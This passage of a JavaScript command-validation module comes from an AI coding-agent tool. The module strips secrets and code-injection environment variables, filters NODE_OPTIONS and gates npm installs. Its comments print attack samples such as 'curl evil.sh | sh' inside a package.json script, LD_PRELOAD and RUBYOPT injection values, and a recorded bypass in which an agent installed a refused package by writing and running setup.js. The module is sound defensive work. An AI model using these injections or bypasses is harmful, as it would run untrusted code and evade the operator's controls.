 * caveats (read the paragraph above: it is a layer, not a boundary).
 *
 * @param {string} name an environment variable name
 * @returns {boolean} true when the VALUE should not be shown or logged
 */
export function secretlyNamed(name) {
  return SECRET_NAME.test(String(name ?? ''));
}

/**
 * ── ⚠️⚠️ THE HOLE THAT WAS OPEN IN THIS FILE THE WHOLE TIME ─────────────────
 *
 * `REFUSED_NODE_FLAGS` refuses `--require`, `--import`, `--loader` and
 * `--env-file` BY NAME, with a paragraph each explaining why preloading a module
 * the command does not name is unreviewable. And then the child was handed the
 * parent's `NODE_OPTIONS`, which carries those same flags into every `node`
 * process ever spawned. The command-line door was bolted and the window next to
 * it was open — same file, same class, one env var.
 *
 * ⚠️ It is not node-specific either. Every runtime has one, and a preset that
 * adds `python` or `ruby` adds that runtime's version of the same hole:
 *
 *   RUBYOPT=-revil        · PERL5OPT=-Mevil     · PYTHONSTARTUP=/tmp/evil.py
 *   LD_PRELOAD=/tmp/evil.so                     · DYLD_INSERT_LIBRARIES=…
 *
 * These are dropped outright: none of them has a common legitimate use in a
 * one-shot test run, and every one of them is code injection into a process we
 * are about to trust the output of.
 *
 * ⚠️ WHAT IS DELIBERATELY *NOT* DROPPED: the search paths — `PYTHONPATH`,
 * `RUBYLIB`, `PERL5LIB`, `LD_LIBRARY_PATH`, `PATH` itself. They are weaker (they
 * change where a *named* import is found, not what runs unasked) and they are
 * load-bearing in real repositories. Dropping them would be the "check that
 * fails correct work" failure — a monorepo whose tests need `PYTHONPATH=src`
 * would start failing for a reason nobody could see. `PATH` in particular is how
 * a preset binary is found at all.
 */
const INJECT_ENV_NAMES = new Set([
  'RUBYOPT', 'PERL5OPT', 'PYTHONSTARTUP', 'PYTHONINSPECT', 'PYTHONBREAKPOINT',
  'LD_PRELOAD', 'LD_AUDIT', 'DYLD_INSERT_LIBRARIES',
  'NODE_REPL_EXTERNAL_MODULE', 'BUN_INSPECT_CONNECT_TO',
]);

/**
 * The `NODE_OPTIONS` tokens that are the command-line refusals wearing a hat.
 * Kept in step with `REFUSED_NODE_FLAGS` on purpose — a flag refused in one
 * place and permitted in the other is the drift this whole comment is about.
 */
const NODE_OPTIONS_REFUSED = new Set([
  '-r', '--require', '--import', '--loader', '--experimental-loader',
  '-e', '--eval', '-p', '--print', '--env-file', '--env-file-if-exists',
  '--inspect', '--inspect-brk', '--inspect-port', '--inspect-publish-uid',
  '--watch', '--watch-path', '--test-reporter', '--conditions', '-C',
  '--cpu-prof', '--heap-prof', '--diagnostic-dir', '--report-directory',
]);

/**
 * ⭐ FILTERED, NOT DELETED — and that distinction is the whole point.
 *
 * `NODE_OPTIONS=--max-old-space-size=4096` is ordinary, correct, load-bearing
 * configuration; a build that needs it OOMs without it. Deleting the variable
 * to close the injection would break real work to stop a hypothetical, which is
 * the failure mode this package has been bitten by four separate times. So the
 * dangerous tokens are removed and the rest is passed through intact.
 *
 * ⚠️ AND WHEN IT CANNOT BE PARSED, IT GOES. `NODE_OPTIONS` supports quoting, and
 * a half-understood quoted string is precisely how a filter gets walked past
 * (`--require "a b.js"` tokenises to three pieces under a naive split). We do
 * not write a quote parser to guess: a value containing a quote is dropped
 * whole, which fails safe and is honest about why.
 *
 * Pure.
 *
 * @param {string} value
 * @returns {string | null} the filtered value, or null if nothing may survive
 */
export function sanitizeNodeOptions(value) {
  if (typeof value !== 'string') return null;
  // eslint-disable-next-line no-control-regex
  if (/["']|[\u0000-\u001f]/.test(value)) return null;
  const tokens = value.trim().split(/\s+/).filter(Boolean);
  const kept = [];
  for (let i = 0; i < tokens.length; i += 1) {
    const token = tokens[i];
    const eq = token.indexOf('=');
    const key = eq === -1 ? token : token.slice(0, eq);
    if (NODE_OPTIONS_REFUSED.has(key)) {
      // `--require ./evil.js` is TWO tokens. Dropping only the flag would leave
      // the path behind as a bare argument, which node reads as a script to run.
      if (eq === -1 && tokens[i + 1] && !tokens[i + 1].startsWith('-')) i += 1;
      continue;
    }
    kept.push(token);
  }
  return kept.length ? kept.join(' ') : null;
}

/**
 * ⚠️ THE SHAPES ARE DECLARED, not inferred — same reason as `workspace.mjs`.
 * Left to inference, the return type becomes the three literal keys assigned at
 * the bottom of this function, and every `scrubbed.PATH` at a call site is a
 * type error instead of a lookup.
 *
 * @param {Record<string, string | undefined>} [env]
 * @returns {Record<string, string>}
 */
/**
 * ── ⚠️⚠️ THE GATED ROAD WAS THE SAFE ONE AND THE UNGATED ROAD WAS NOT ───────
 *
 * With `ACUVO_ALLOW_INSTALL` unset, `npm install is-number` is refused with a
 * paragraph. An adversarial pass then wrote `setup.js` with `write_file` and
 * ran `node setup.js`, which installed the same package — exit 0, and with
 * LIFECYCLE SCRIPTS ENABLED, because `--ignore-scripts` is a flag this module
 * puts on the npm command line and a command line it never sees has no flags on
 * it. So the road with the gate on it was strictly safer than the road without,
 * which is the wrong way round.
 *
 * ⚠️ THE HOLE ITSELF DOES NOT CLOSE, AND SAYING OTHERWISE WOULD BE THE LIE.
 * `node <a file the model wrote>` is a risk this package carries in the open
 * and has always carried: `validateInstallSpec`'s own paragraph names it. What
 * CAN close is the ESCALATION — the step from "code the model wrote runs" to
 * "a stranger's `postinstall` runs", which is the actual npm supply-chain
 * vector and the one the Shai-Hulud worm used.
 *
 * ⭐ MEASURED, NOT ASSUMED (2026-08-15, this npm):
 *   · `npm_config_ignore_scripts=true` in the ENVIRONMENT suppresses a
 *     dependency's `postinstall` — verified against a control run where the
 *     same probe file WAS written, so the probe can genuinely detect it.
 *   · It reaches npm however npm was started, including from inside a script,
 *     which a command-line flag cannot.
 *
 * ⚠️⚠️ AND IT IS DELIBERATELY NOT APPLIED TO npm ITSELF, because the same
 * measurement showed the cost: with it set, `npm run build` still runs `build`
 * but SILENTLY SKIPS `prebuild`. This package explicitly resolves and validates
 * `[pre<name>, <name>, post<name>]` in `validateNpmScriptChain` — pre/post
 * hooks are behaviour it supports on purpose, and breaking them with no message
 * would be a guard that fails correct work, which is worse than no guard.
 *
 * ⚠️ THE ONE COST THAT REMAINS, STATED RATHER THAN HIDDEN: a NON-npm child that
 * shells out to `npm run build` loses that build's `prebuild` hook. It is the
 * narrow case, it is inside the accepted-risk zone already, and it buys the
 * removal of the escalation above.
 *
 * ⭐ DERIVED FROM THE ARGV IT IS ABOUT TO SPAWN, not from a caller's boolean —
 * the precedent `buildInvocation` sets two hundred lines down, and it matters
 * here because npm is spawned as `node …/npm-cli.js`, so the FILE is `node`.
 *
 * @param {{file?: string, args?: string[]}} invocation what is about to be spawned
 * @param {Record<string, string|undefined>} [env]
 */
export function childEnvironment({ file = '', args = [] } = {}, env = process.env) {
  const out = scrubEnvironment(env);
  if (!spawnsNpmItself(file, args)) out.npm_config_ignore_scripts = 'true';
  return out;
}

/** Is npm/npx the program here — directly, or as the `.js` file node is handed? */
function spawnsNpmItself(file, args) {
  const words = [String(file ?? ''), ...(Array.isArray(args) ? args.map(String) : [])];
  return words.some((w) => /(^|[\\/])(npm|npx)(\.cmd|\.exe)?$/i.test(w) || /(^|[\\/])(npm|npx)-cli\.js$/i.test(w));
}

export function scrubEnvironment(env = process.env) {
  /** @type {Record<string, string>} */
  const out = {};
  for (const [name, value] of Object.entries(env)) {
    if (value === undefined) continue;
    if (SECRET_NAME.test(name)) continue;
    // ⚠️ The preload/injection variables — see INJECT_ENV_NAMES. A flag refused
    // on the command line and permitted through the environment is not refused.
    if (INJECT_ENV_NAMES.has(name)) continue;
    if (name === 'NODE_OPTIONS') {
      const filtered = sanitizeNodeOptions(value);
      if (filtered !== null) out[name] = filtered;
      continue;
    }
    out[name] = value;
  }
  // Belt and braces: these two are the ones that must never survive, whatever
  // the pattern does or does not match after a future edit.
  delete out.OPENROUTER_API_KEY;
  delete out.OPENROUTER_CODEGEN_MODEL;
  /**
   * ── ⚠️⚠️ `NODE_TEST_CONTEXT` — A SILENT GREEN, MEASURED SIDE BY SIDE ────────
   *
   * `node --test` sets this in every child it starts. A nested `node --test`
   * that inherits it believes it is a TEST WORKER: it stops printing TAP and
   * starts writing a serialised v8 stream to a parent that is not listening.
   * The run then reports **exit 0 with zero bytes of output** — a suite that
   * failed, reported as a pass, with nothing on screen to give it away.
   *
   * MEASURED 2026-08-11, both spawners against the identical failing test file,
   * from inside a `node --test` process (`NODE_TEST_CONTEXT="child-v8"`):
   *
   *   run_command  → exitCode 0 · 0 bytes of stdout      ← the lie
   *   run_program  → exitCode 1 · 951 bytes of stdout    ← the truth
   *
   * `spawn-argv.mjs` found this first and deleted it locally, saying so
   * explicitly: *"Deleted here rather than in `scrubEnvironment` because that
   * function is shared with `run_command` and this module must not change its
   * behaviour."* That was the correct call for a lane that owned one file. At
   * integration it is the wrong place for the fix — two spawners that disagree
   * about whether a suite passed is worse than either of them being wrong, and
   * the disagreement is invisible until someone runs both.
   *
   * ⚠️ SAFE FOR EVERY CALLER. `git.mjs` and `evaluate.mjs` share this function
   * and neither wants a child that believes it is a test worker. And for the
   * ordinary user nothing changes at all: `bin/acuvo.mjs` is not run under
   * `node --test`, so the variable is not set and the delete is a no-op. What it
   * fixes is the case where it IS set — a CI harness, an agent running the CLI
   * from inside a test, and this package's own suite.
   */
  delete out.NODE_TEST_CONTEXT;
  // ⚠️ CI=1 is not cosmetic — it is what makes vitest, jest and half the npm
  // ecosystem run once and exit instead of watching, which is the difference
  // between a result and a timeout.
  out.CI = '1';
  // ANSI escape sequences in a tool result are control characters the model
  // pays for and cannot use.
  out.NO_COLOR = '1';
  out.FORCE_COLOR = '0';
  return out;
}

/**
 * Split a command string into tokens, refusing anything a shell could act on.
 *
 * Pure. Tokenising on whitespace is only safe BECAUSE quotes are already
 * refused — there are no quoting semantics left to get wrong, which is the
 * second reason the character whitelist comes first.
 *
 * @typedef {{ ok: false, error: string }} CommandRefused
 * @param {unknown} raw
 * @returns {{ ok: true, command: string, tokens: string[] } | CommandRefused}
 */
export function tokenizeCommand(raw) {
  if (typeof raw !== 'string') return { ok: false, error: 'command must be a string' };
  const command = raw.trim();
  if (!command) return { ok: false, error: 'empty command' };
  if (command.length > MAX_COMMAND_LENGTH) {
    return { ok: false, error: `command is ${command.length} characters, over the ${MAX_COMMAND_LENGTH} limit` };
  }
  // Checked before anything else: a newline is not a character in a command,
  // it is a second command.
  // eslint-disable-next-line no-control-regex
  if (/[\u0000-\u001f\u007f]/.test(command)) {
    return { ok: false, error: 'command contains a control character (a newline would be a second command)' };
  }
  if (!SAFE_COMMAND_CHARS.test(command)) {
    const bad = command.match(UNSAFE_CHAR)?.[0] ?? '?';
    /**
     * ── ⭐⭐ A REFUSAL MUST NAME THE WAY THROUGH, OR IT READS AS A CEILING ────
     *
     * This message explained the MODEL OF THE WORLD — no shell, one plain
     * command — and stopped there. So the agent believed the capability was
     * absent and gave up, while `run_program` and `evaluate` sat right beside it
     * doing exactly the job.
     *
     * ⚠️ MEASURED 2026-08-14, and it cost a whole task. A dogfood run asked for
     * `node -e "…"` — the commonest zero-dependency check there is — hit this
     * wall, and the run ended having done nothing. The reviewing agent nearly
     * filed it as a MISSING CAPABILITY, which would have been wrong: the
     * capability ships, takes the same allowlist, and is one tool call away.
     *
     * ⭐ THE RULE: when a refusal exists because a SAFER PATH exists, the
     * refusal must name that path. Anything else teaches the reader the tool
     * cannot do it — and an agent that believes a thing is impossible stops
     * trying, which is the most expensive way to be wrong.
     *
     * ⚠️ The two are not interchangeable, so the wording distinguishes them
     * rather than offering a vague "try something else": `run_program` takes a
     * real argument ARRAY (no shell, so quotes and spaces are just characters),
     * and `evaluate` is the one for JavaScript, which is what `node -e` was
     * reaching for in the first place.
     */
    return {
      ok: false,
      error: `"${bad}" is not allowed in a command. There is no shell here: pipes, &&, ;, redirection, quotes, backticks and $() are refused, so run one plain command per call.`
        + ` For an argument containing quotes or spaces, use run_program — it takes a real argument array, so nothing needs quoting.`
        + ` To run JavaScript (what \`node -e\` is for), use evaluate.`,
    };
  }
  const tokens = command.split(/ +/).filter(Boolean);
  if (tokens.length > MAX_COMMAND_TOKENS) {
    return { ok: false, error: `command has ${tokens.length} arguments, over the ${MAX_COMMAND_TOKENS} limit` };
  }
  return { ok: true, command, tokens };
}

/** A non-flag token must be a legal workspace path — the same rule, and the
 *  same function, the file tools use. `..`, absolute paths, drive letters, UNC
 *  and spaces are therefore already dead. */
function checkOperand(token, binary, { packagePatterns = false } = {}) {
  /**
   * ── ⚠️⭐ A GLOB IS CHECKED FOR CONTAINMENT, NOT FOR BEING A FILENAME ────────
   *
   * `normalizeRelativePath` is the WRITE boundary — it decides where bytes may
   * land, and there `*` is meaningless and rightly refused. But a command
   * ARGUMENT is not a destination, and `node --test test/*.test.mjs` is both the
   * commonest test invocation in Node and this package's own test script. Sending
   * it through the write validator meant Acuvo Code could not run Acuvo Code's
   * test suite.
   *
   * ⭐ So the wildcard segments are replaced with a placeholder and the SHAPE is
   * validated: `..`, absolute paths, drive letters and URLs stay refused exactly
   * as before, because those are the properties that let an argument escape. What
   * is no longer required is that the string name a single existing file.
   *
   * ⚠️ THE WRITE BOUNDARY IS UNTOUCHED. Nothing here loosens where a file may be
   * written; `resolveInWorkspace` still refuses `*` outright, and the traversal
   * tests that pin it still pass. Expansion is done by node itself, verified
   * live: spawned with `shell: false`, the literal glob reached node and it
   * expanded it — 316 tests, exit 0.
   */
  const hasGlob = /[*?]/.test(token);
  let probe = hasGlob ? token.replace(/[*?]+/g, 'g') : token;

  /**
   * ── ⚠️⭐ `go test ./...` — A PACKAGE PATTERN IS NOT A PATH, EITHER ──────────
   *
   * Exactly the same lesson the glob above taught, in a second ecosystem. `...`
   * is Go's "and everything under here" wildcard, and `./...` is *the* canonical
   * way to test a Go module — it appears in nearly every Go CI file on earth.
   * `normalizeRelativePath` refuses it, correctly and for a Windows reason: a
   * segment of nothing but dots is a directory Windows will create and then not
   * let you delete. That rule is right for a WRITE destination and wrong for a
   * command argument, which never names a destination.
   *
   * ⚠️ ONLY THE EXACT SEGMENT `...` IS SUBSTITUTED, so `..` is untouched and
   * `go test ../.../x` is still refused with the ".." reason. The containment
   * property is unchanged; what is relaxed is the requirement that the string
   * name a directory that could exist.
   */
  if (packagePatterns && probe.includes('...')) {
    probe = probe.split(/[\\/]/).map((seg) => (seg === '...' ? 'g' : seg)).join('/');
  }

  const norm = normalizeRelativePath(probe);
  if (!norm.ok) return { ok: false, error: `"${token}" is not usable as an argument to ${binary}: ${norm.reason}` };
  /**
   * ⚠️ A glob is NOT resolved to a real path — it does not name one yet. Return
   * the token as written so the child receives exactly what the user typed;
   * substituting the probe would run the tests in a directory called "g".
   */
  if (hasGlob) return { ok: true, token, glob: true };
  return { ok: true };
}

function checkFlag(token, { flags, valueFlags, separateValueFlags, refused, binary, custom }) {
  const eq = token.indexOf('=');
  const key = eq === -1 ? token : token.slice(0, eq);
  const reason = refused?.get(key);
  if (reason) return { ok: false, error: `${key} is refused: ${reason}` };
  /**
   * ⚠️ A CUSTOM BINARY'S GRAMMAR IS THE ADMIN'S, SO SAY SO. "not an allowed
   * flag" reads as our decision; for a binary someone added themselves the
   * decision was theirs, and the fix is one edit away from where they made it.
   */
  const notAllowed = (what) => (custom
    ? { ok: false, error: `${what} was not declared for "${binary}". A binary added through ${ALLOW_COMMANDS_ENV} gets only the flags declared with it — we cannot know a stranger program's argument semantics, so we do not guess. Declare it: ${ALLOW_COMMANDS_ENV}="${binary}:${key}".` }
    : { ok: false, error: `${what} is not an allowed ${binary} flag (allowed: ${[...(flags ?? [])].join(' ')})` });

  if (eq === -1) {
    if (flags?.has(key)) return { ok: true };
    if (separateValueFlags?.has(key)) return { ok: true, wantsValue: key };
    return notAllowed(key);
  }
  if (!valueFlags?.has(key)) return notAllowed(`${key}=…`);
  const value = token.slice(eq + 1);
  if (!value) return { ok: false, error: `${key}= was given no value` };
  return { ok: true };
}

/**
 * ⚠️ WHY A SEPARATE-VALUE FLAG NEEDS ITS OWN STATE RATHER THAN FALLING THROUGH
 * TO THE OPERAND CHECK — and this is a real hole that the naive version had.
 *
 * `python -m pytest` is normal. `python -m pip install requests` is a registry
 * fetch wearing the same clothes, and if `-m`'s value is validated as an
 * ordinary operand then `pip`, `install` and `requests` are all perfectly legal
 * relative paths and the whole thing passes. So the VALUE is checked against
 * what that specific flag may take, and the value is consumed rather than
 * re-examined as a path.
 */
function checkFlagValue(rule, value, key, binary) {
  if (rule instanceof RegExp) {
    if (!rule.test(value)) return { ok: false, error: `"${value}" is not a value ${binary} ${key} accepts` };
    return { ok: true };
  }
  if (!rule.has(value)) {
    return { ok: false, error: `${binary} ${key} ${value} is refused — only ${[...rule].join(', ')} may follow ${key}. Anything that installs from a package registry fetches and runs a stranger's code, which no allowlist of program names can check.` };
  }
  return { ok: true };
}

function validateOperands(tokens, from, spec) {
  for (let i = from; i < tokens.length; i += 1) {
    const token = tokens[i];
    if (!token.startsWith('-')) {
      const check = checkOperand(token, spec.binary, { packagePatterns: spec.packagePatterns });
      if (!check.ok) return check;
      continue;
    }
    const check = checkFlag(token, spec);
    if (!check.ok) return check;
    if (check.wantsValue) {
      const value = tokens[i + 1];
      if (value === undefined) return { ok: false, error: `${check.wantsValue} was given no value` };
      const rule = spec.separateValueFlags.get(check.wantsValue);
      const verdict = checkFlagValue(rule, value, check.wantsValue, spec.binary);
      if (!verdict.ok) return verdict;
      i += 1;
    }
  }
  return { ok: true };
}

function validateNode(command, tokens) {
  const spec = { flags: NODE_FLAGS, valueFlags: NODE_VALUE_FLAGS, refused: REFUSED_NODE_FLAGS, binary: 'node' };
  const check = validateOperands(tokens, 1, spec);
  if (!check.ok) return check;
  return { ok: true, command, tokens, binary: 'node' };
}

function validateVitest(command, tokens, from, binary) {
  /**
   * ⚠️ `vitest` WITHOUT `run` IS A WATCHER. It never exits, so it would burn
   * the entire timeout and hand the model back nothing but "timed out" — a
   * round spent, money spent, nothing learned. Requiring the word is one
   * refusal the model can act on immediately, and the message says how.
   */
  if (tokens[from] !== 'run') {
    return { ok: false, error: 'vitest must be run as "vitest run …" — without `run` it starts a watcher that never exits' };
  }
  const spec = { flags: VITEST_FLAGS, valueFlags: VITEST_VALUE_FLAGS, refused: null, binary: 'vitest' };
  const check = validateOperands(tokens, from + 1, spec);
  if (!check.ok) return check;
  return { ok: true, command, tokens, binary };
}

function validateTsc(command, tokens, from, binary) {
  const spec = { flags: TSC_FLAGS, valueFlags: TSC_VALUE_FLAGS, refused: REFUSED_TSC_FLAGS, binary: 'tsc' };
  const check = validateOperands(tokens, from, spec);
  if (!check.ok) return check;
  return { ok: true, command, tokens, binary };
}

function validateNpm(command, tokens, { allowInstall = false } = {}) {
  const sub = tokens[1];
  if (NPM_INSTALL_SUBCOMMANDS.has(sub)) {
    /**
     * ⭐ THE REFUSAL NAMES THE SWITCH. This is the reachability half of the
     * feature and it is not decoration: a capability whose only door is an
     * environment variable nobody mentions is a capability that does not exist.
     * The agent that hits this can tell the human the exact line to run, in the
     * same round it discovered it needed a dependency.
     */
    if (!allowInstall) {
      return {
        ok: false,
        /**
         * ⚠️ THE PHRASE "never installs or publishes" IS LOAD-BEARING TEXT, not
         * prose. `test/spawn-argv.test.mjs` pins it as the default surface's
         * promise, and that promise is unchanged: with no environment variable
         * set, this sentence is the whole behaviour.
         */
        error: `npm ${sub} is refused — on the default surface this agent never installs or publishes, because an install downloads and runs code from the registry, which is the one thing an allowlist of program names cannot check. A human can switch installs on for this machine by setting ${ALLOW_INSTALL_ENV}=1 in the environment that launches acuvo-code (the agent has no verb that reaches it). When it is on: --ignore-scripts is forced, only registry names are accepted (no URL, git, file: or npm: alias), and the change to package.json is saved so you can see it in the diff.`,
      };
    }
    return validateNpmInstall(command, tokens);
  }
  if (sub === 'test' || sub === 't') {
    if (tokens.length !== 2) return { ok: false, error: 'npm test takes no extra arguments here' };
    return { ok: true, command, tokens, binary: 'npm', npmScript: 'test' };
  }
  if (sub === 'run' || sub === 'run-script') {
    if (tokens.length !== 3) {
      return { ok: false, error: 'use exactly "npm run <script>" — extra npm arguments are refused' };
    }
    const script = tokens[2];
    if (!/^[A-Za-z0-9][A-Za-z0-9:._-]*$/.test(script)) return { ok: false, error: `"${script}" is not a valid npm script name` };
    return { ok: true, command, tokens, binary: 'npm', npmScript: script };
  }
  /**
   * ⚠️ `exec` / `publish` / `link` ARE THE INTERESTING REFUSALS AND HAVE NO
   * SWITCH. `exec` fetches and runs a package without recording it anywhere —
   * everything `install` costs with none of the reviewable receipt that made
   * `install` gateable at all. `publish` pushes this repository to a public
   * registry, which is not a step an agent takes unattended, in any mode.
   */
  return {
    ok: false,
    error: `npm ${sub ?? '(nothing)'} is refused — only "npm test" and "npm run <script>" are allowed (plus "npm install"/"npm ci" when ${ALLOW_INSTALL_ENV}=1). exec and publish have no switch at all: exec runs registry code without recording what it ran, and publish uploads this repository.`,
  };
}

/**
 * ── ⭐ THE ONE AUTHORITY, FOR BOTH DOORS ────────────────────────────────────
 *
 * `run_command` reaches install through `validateCommand` (string → tokenizer →
 * `validateNpm`). `run_program` reaches it through here (argv, already split).
 * Both end at the SAME `validateNpm`, so there is no second, laxer path — the
 * defect shape this file's header names in its own first paragraph.
 *
 * ⚠️ THE ARGV DOOR SKIPS THE CHARACTER WHITELIST, AND THAT IS THE POINT OF
 * `spawn-argv.mjs`: an argv slot needs no tokenizer because nothing will re-parse
 * it. For an install it costs nothing, because the thing that actually decides
 * safety here is `validateInstallSpec`, which is a whitelist of SHAPE and runs
 * on every operand either way. It is why `zod@^4.1.0` works through this door
 * and not the other one.
 *
 * @param {unknown} args e.g. `['install', 'zod']`
 * @param {{ allowInstall?: boolean }} [opts]
 */
export function validateNpmInstallArgv(args, { allowInstall = false } = {}) {
  if (!Array.isArray(args) || args.some((a) => typeof a !== 'string')) {
    return { ok: false, error: 'npm install needs an array of string arguments, e.g. ["install", "zod"]' };
  }
  const tokens = ['npm', ...args];
  return validateNpm(tokens.join(' '), tokens, { allowInstall });
}

function validateNpx(command, tokens) {
  const pkg = tokens[1];
  if (!ALLOWED_NPX_PACKAGES.includes(pkg)) {
    return {
      ok: false,
      error: `npx ${pkg ?? '(nothing)'} is refused — npx runs a package from the registry, so only ${ALLOWED_NPX_PACKAGES.join(' and ')} are allowed, and only if already installed here.`,
    };
  }
  if (pkg === 'vitest') return validateVitest(command, tokens, 2, 'npx');
  return validateTsc(command, tokens, 2, 'npx');
}

/**
 * A preset (or admin-declared) binary, validated through the SAME machinery the
 * original four use: the character whitelist has already run, the flags are a
 * whitelist, and every non-flag operand goes through `normalizeRelativePath`.
 *
 * ⚠️ There is no second, laxer path here. That was the specific way this could
 * have gone wrong — "the four are checked properly and the new ones get a quick
 * once-over" — so the subcommand gate is the only thing added, and it is a
 * whitelist too.
 */
function validatePreset(command, tokens, spec, allowlist) {
  const binary = spec.binary;
  let from = 1;

  if (spec.subcommands) {
    const sub = tokens[1];
    const refusedReason = spec.refusedSubcommands?.get(sub);
    if (refusedReason) return { ok: false, error: `${binary} ${sub} is refused: ${refusedReason}` };
    if (sub === undefined) {
      return { ok: false, error: `${binary} needs a subcommand — one of: ${[...spec.subcommands].join(', ')}` };
    }
    if (!spec.subcommands.has(sub)) {
      return { ok: false, error: `${binary} ${sub} is not allowed. Allowed: ${[...spec.subcommands].join(', ')}${spec.refusedSubcommands?.size ? `. Refused on purpose: ${[...spec.refusedSubcommands.keys()].join(', ')}` : ''}` };
    }
    from = 2;

    /**
     * ⭐ `bundle exec rspec` DELEGATES THE PROGRAM CHOICE, so the delegated name
     * goes back through the allowlist rather than being trusted. Without this,
     * one allowed binary would launder every other one — the same shape as the
     * `npm test` bypass, arriving through a different door.
     */
    if (spec.delegates) {
      const inner = tokens[2];
      if (!inner) return { ok: false, error: `${binary} exec needs a program to run` };
      const innerSpec = allowlist.grammar.get(inner);
      if (!innerSpec || innerSpec.builtin) {
        return { ok: false, error: `${binary} exec ${inner} is refused — "${inner}" is not itself on the allowlist, and delegating the choice of program is exactly what an allowlist of programs must not permit.` };
      }
      const rest = validateOperands(tokens, 3, innerSpec);
      if (!rest.ok) return rest;
      return { ok: true, command, tokens, binary, spec };
    }
  }

  const check = validateOperands(tokens, from, spec);
  if (!check.ok) return check;
  return { ok: true, command, tokens, binary, spec };
}

/**
 * The whole gate, as one pure function. Every refusal is a sentence that says
 * what to do instead, because the audience is a model that gets another round.
 *
 * @param {unknown} raw
 * @param {{ script?: boolean, allowlist?: Allowlist, allowInstall?: boolean }} [opts]
 *   `script: true` validates a package.json script BODY rather than a command
 *   the model wrote — different binary list, same everything else. `allowlist`
 *   defaults to the four, so every existing caller is unchanged.
 *
 *   ⚠️ `allowInstall` DEFAULTS TO FALSE AND THAT IS THE SAFETY PROPERTY. Every
 *   existing call site — `acceptance.mjs`, `background.mjs`, `spawn-argv.mjs`'s
 *   flag probe, the script-body validator — keeps refusing `npm install`
 *   without being edited. Only the one caller that has read the operator's
 *   environment can turn it on, and it has to say so explicitly.
 *
 *   ⚠️ It is NOT read from `process.env` in here. This function is pure and a
 *   thousand tests depend on that; a hidden environment read would also make
 *   the script-body path (`script: true`) silently inherit the switch, and an
 *   npm script that says `npm install` is exactly the chain this file refuses
 *   to follow.
 */
export function validateCommand(raw, { script = false, allowlist = DEFAULT_ALLOWLIST, allowInstall = false } = {}) {
  const tok = tokenizeCommand(raw);
  if (!tok.ok) return tok;
  const { command, tokens } = tok;
  const binary = tokens[0];
  const allowed = script ? ALLOWED_SCRIPT_BINARIES : allowlist.binaries;
  if (!allowed.includes(binary)) {
    if (script) {
      return { ok: false, error: `the script runs "${binary}", which this agent cannot verify. An npm script may only run: ${allowed.join(', ')}.` };
    }
    /**
     * ⭐ THE REFUSAL HAS TO NAME THE WAY OUT. Measured on the glob refusal
     * earlier in this file: a message that names a rule and not an alternative
     * costs a whole round, because the model has nothing to do differently. So
     * when the binary is one a shipped preset provides, say which preset and
     * where to switch it on.
     */
    const preset = presetProviding(binary);
    const hint = preset
      ? ` "${binary}" ships in the "${preset}" preset (${COMMAND_PRESETS[preset].describe}), which is OFF by default. Enable it by adding {"presets":["${preset}"]} to ${COMMANDS_CONFIG_FILE}, or by setting ${ALLOW_COMMANDS_ENV}=${preset} in the environment.`
      : ` Other ecosystems ship as presets (${PRESET_NAMES.join(', ')}) and are off until enabled in ${COMMANDS_CONFIG_FILE}; a program of your own can be added with ${ALLOW_COMMANDS_ENV}.`;
    return {
      ok: false,
      error: `"${binary}" is not a program this agent may run. Allowed here: ${allowed.join(', ')}.${hint}`,
    };
  }
  switch (binary) {
    case 'node': return validateNode(command, tokens);
    case 'vitest': return validateVitest(command, tokens, 1, 'vitest');
    /**
     * ⚠️ MEASURED, NOT ASSUMED: `&& !script` is UNREACHABLE TODAY. Mutating it
     * away left `test/npm-install.test.mjs` green, because `npm` is not in
     * `ALLOWED_SCRIPT_BINARIES` and a script body naming npm dies twenty lines
     * above this. It stays as defence in depth — the day someone adds `npm` to
     * that list, an npm script body reading `npm install evil` must still be a
     * chain this validator refuses to follow rather than one it walks — and the
     * test pins the BINARY LIST, which is the guard that actually holds.
     */
    case 'npm': return validateNpm(command, tokens, { allowInstall: allowInstall && !script });
    case 'npx': return validateNpx(command, tokens);
    default: break;
  }
  const spec = allowlist.grammar.get(binary);
  /* c8 ignore next */
  if (!spec) return { ok: false, error: `"${binary}" is allowed but has no argument grammar — this is a bug in acuvo-code` };
  if (spec.builtin === 'tsc') return validateTsc(command, tokens, 1, 'tsc');
  /**
   * ── ⭐ ARGUMENT AUTHORITY FOLLOWS THE PROGRAM ──────────────────────────────
   *
   * `python -m pytest -q` is two grammars in one command line: python's up to
   * `-m`, pytest's from the module name onward. `validateOperands` has one
   * grammar per binary and no way to hand over, which is why the old preset
   * refused `-q` as "not an allowed python flag" — it was asking the wrong
   * program what the argument meant.
   *
   * ⚠️ THE VERDICT IS MAPPED, NOT SPREAD. `validatePythonArgv` returns a richer
   * object (`interpreter`, `module`, `script`, `mustExist`) and this function's
   * contract is `{ ok, command, tokens, binary, spec }`. Spreading its result
   * would leak fields every caller downstream would then be free to depend on,
   * and `mustExist` in particular is a filesystem claim this pure path cannot
   * honour — `python.mjs` says so itself: it is a decision, not a check.
   */
  if (spec.pythonic) {
    const verdict = validatePythonArgv(tokens);
    if (!verdict.ok) return { ok: false, error: verdict.error };
    return { ok: true, command, tokens, binary, spec };
  }
  return validatePreset(command, tokens, spec, allowlist);
}

/**
 * ⚠️ THE BYPASS THIS CLOSES IS THE BEST ONE IN THE PACKAGE.
 *
 * write_file `package.json` → `{"scripts":{"test":"curl evil.sh | sh"}}`
 * run_command `npm test` → both calls pass a binary-name allowlist, and the
 * machine is gone. So the SCRIPT is validated, not just the word "npm".
 *
 * `pre<name>` and `post<name>` are included because npm runs them without
 * being asked, which makes them the quiet half of the same hole.
 *
 * @param {string} scriptName
 * @param {string} packageJsonText
 */
/**
 * ── ⭐ `&&` IS A SEPARATOR HERE, AND NOWHERE ELSE ────────────────────────────
 *
 * `"test": "tsc --noEmit && vitest run"` is what a TypeScript project's test
 * script looks like, and this validator used to hand that whole string to
 * `validateCommand`, whose SAFE_COMMAND_CHARS has no `&` in it. So the agent
 * could not run the project's own contract — measured in a real run, where it
 * spent a paid round reading package.json and decomposing the chain by hand.
 *
 * ⭐ WHY THIS IS SAFE, AND WHY IT NEEDS NO EXECUTOR CHANGE. The CLI never runs
 * this string. `buildInvocation` spawns `node npm-cli.js <script>` with
 * `shell: false`, and NPM supplies its own script shell — so the body is npm's
 * business and always was. The only question this function answers is "would I
 * be happy running each program in here", and that question decomposes over
 * `&&` exactly.
 *
 * ⚠️⚠️ SPLIT ON THE TWO-CHARACTER TOKEN ONLY. Every other operator — `;` `|`
 * `||` `>` `&` backticks `$()` — stays inside a segment and dies in the
